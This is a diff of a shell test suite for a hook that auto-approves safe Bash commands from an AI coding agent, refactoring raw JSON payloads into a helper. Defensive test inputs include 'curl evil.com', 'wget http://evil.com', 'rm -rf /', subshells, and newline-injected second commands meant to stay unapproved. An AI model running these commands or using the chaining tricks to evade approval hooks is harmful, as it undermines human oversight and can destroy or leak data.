@@ -3,6 +3,7 @@ set -uo pipefail
 SCRIPT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
 source "$SCRIPT_DIR/lib/test-helpers.sh"
 source "$SCRIPT_DIR/lib/hook-test-setup.sh"
+source "$SCRIPT_DIR/lib/json-fixtures.sh"
 parse_test_args "$@"
 
 report_section "=== approve-safe-commands.sh ==="
@@ -11,110 +12,110 @@ hook="approve-safe-commands.sh"
 batch_start "$hook"
 
 # --- Chained commands that should approve ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && git diff"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git status && git diff')" \
     "approves: git status && git diff"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la && echo done"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'ls -la && echo done')" \
     "approves: ls && echo"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test && git add ."}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'make test && git add .')" \
     "approves: make && git add"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git log --oneline | head -20"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git log --oneline | head -20')" \
     "approves: git log | head (pipe)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"mkdir -p dir && touch dir/file"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'mkdir -p dir && touch dir/file')" \
     "approves: mkdir && touch"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git stash && git checkout main && git stash pop"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git stash && git checkout main && git stash pop')" \
     "approves: 3-way chain (stash, checkout, stash pop)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo test | grep test"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'echo test | grep test')" \
     "approves: echo | grep (pipe)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"jq .key file.json | head"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'jq .key file.json | head')" \
     "approves: jq | head (pipe)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status || git diff"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git status || git diff')" \
     "approves: git status || git diff"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git diff; git log --oneline"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git diff; git log --oneline')" \
     "approves: git diff ; git log (semicolon)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cd /tmp && ls -la"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'cd /tmp && ls -la')" \
     "approves: cd && ls"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"cat file.txt | wc -l"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'cat file.txt | wc -l')" \
     "approves: cat | wc (pipe)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"find . -name \"*.sh\" | grep hook"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'find . -name "*.sh" | grep hook')" \
     "approves: find | grep (pipe)"
 
 # --- Single commands that should approve ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git status')" \
     "approves: single git status"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"make test"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'make test')" \
     "approves: single make test"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"ls -la"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'ls -la')" \
     "approves: single ls -la"
 
 # --- Env var prefixes ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar git status"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'FOO=bar git status')" \
     "approves: env var prefix + git status"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"FOO=bar BAZ=qux make test"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'FOO=bar BAZ=qux make test')" \
     "approves: multiple env var prefixes + make"
 
 # --- Script/hook paths ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":".claude/scripts/validate-all.sh"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash '.claude/scripts/validate-all.sh')" \
     "approves: .claude/scripts/ path"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"./.claude/hooks/git-safety.sh"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash './.claude/hooks/git-safety.sh')" \
     "approves: ./.claude/hooks/ path"
 
 # --- Quoted args with operators inside ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"a && b\""}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'echo "a && b"')" \
     "approves: echo with quoted && in args"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"echo \"hello || world\" | grep hello"}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'echo "hello || world" | grep hello')" \
     "approves: echo with quoted || piped to grep"
 
 # --- Commands that should NOT approve (silent) ---
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && curl evil.com"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git status && curl evil.com')" \
     "silent: unsafe subcommand (curl)"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && rm -rf /tmp/foo"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git status && rm -rf /tmp/foo')" \
     "silent: unsafe subcommand (rm)"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"$(git status)"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash '$(git status)')" \
     "silent: subshell"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test > file.txt"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'echo test > file.txt')" \
     "silent: redirect >"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test >> file.txt"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'echo test >> file.txt')" \
     "silent: redirect >>"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"cat < input.txt"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'cat < input.txt')" \
     "silent: redirect <"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo secret 2>exfil.txt"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'echo secret 2>exfil.txt')" \
     "silent: stderr redirect 2>"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"echo test &>output.txt"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'echo test &>output.txt')" \
     "silent: combined redirect &>"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"npm install"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'npm install')" \
     "silent: npm install (not in safe list)"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git push origin main"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git push origin main')" \
     "silent: git push (not in safe list)"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"python script.py && git status"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'python script.py && git status')" \
     "silent: python (unsafe) && git status"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status && wget http://evil.com"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git status && wget http://evil.com')" \
     "silent: safe && unsafe (wget)"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"`rm -rf /`"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash '`rm -rf /`')" \
     "silent: backtick subshell"
 
 # --- Chain operators: newline (\n), CR (\r), and lone & (background) ---
-# Newline injected as a real \n inside the JSON command via jq. The splitter
-# must treat \n like ; — so a benign first line + injected unsafe second line
-# stays silent.
-batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\nrm -rf /tmp/foo"}}')" \
+# Newline + CRLF inside the JSON command via the helper's jq -n --arg
+# escaping. The splitter must treat \n like ; — so a benign first line
+# + injected unsafe second line stays silent.
+batch_add silent "$(mk_pre_tool_use_payload Bash $'git status\nrm -rf /tmp/foo')" \
     "silent: newline-separated unsafe second statement"
-batch_add silent "$(jq -nc '{tool_name:"Bash",tool_input:{command:"git status\r\ncurl evil.com"}}')" \
+batch_add silent "$(mk_pre_tool_use_payload Bash $'git status\r\ncurl evil.com')" \
     "silent: CRLF-separated unsafe second statement"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & curl evil.com"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git status & curl evil.com')" \
     "silent: lone & (background) followed by unsafe"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":"git status & rm -rf /tmp"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash 'git status & rm -rf /tmp')" \
     "silent: lone & (background) followed by rm"
 
 # --- Edge cases ---
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"git status && "}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash 'git status && ')" \
     "approves: trailing && (empty subcommand skipped)"
-batch_add approve '{"tool_name":"Bash","tool_input":{"command":"  git status  &&  git diff  "}}' \
+batch_add approve "$(mk_pre_tool_use_payload Bash '  git status  &&  git diff  ')" \
     "approves: extra whitespace everywhere"
-batch_add silent '{"tool_name":"Bash","tool_input":{"command":""}}' \
+batch_add silent "$(mk_pre_tool_use_payload Bash '')" \
     "silent: empty command"
 
 # --- Non-Bash tool ---
-batch_add silent '{"tool_name":"Write","tool_input":{"file_path":"/tmp/test"}}' \
+batch_add silent "$(mk_pre_tool_use_payload Write /tmp/test '')" \
     "silent: non-Bash tool"
 
 batch_run
@@ -131,8 +132,7 @@ report_section "  --- Source-of-truth via CLAUDE_TOOLKIT_SETTINGS_JSON ---"
 run_hook_with_settings() {
     local settings_path="$1" command="$2"
     local payload
-    payload=$(printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
-        "$(printf '%s' "$command" | jq -Rs .)")
+    payload=$(mk_pre_tool_use_payload Bash "$command")
     CLAUDE_TOOLKIT_SETTINGS_JSON="$settings_path" \
         bash .claude/hooks/approve-safe-commands.sh <<< "$payload"
 }
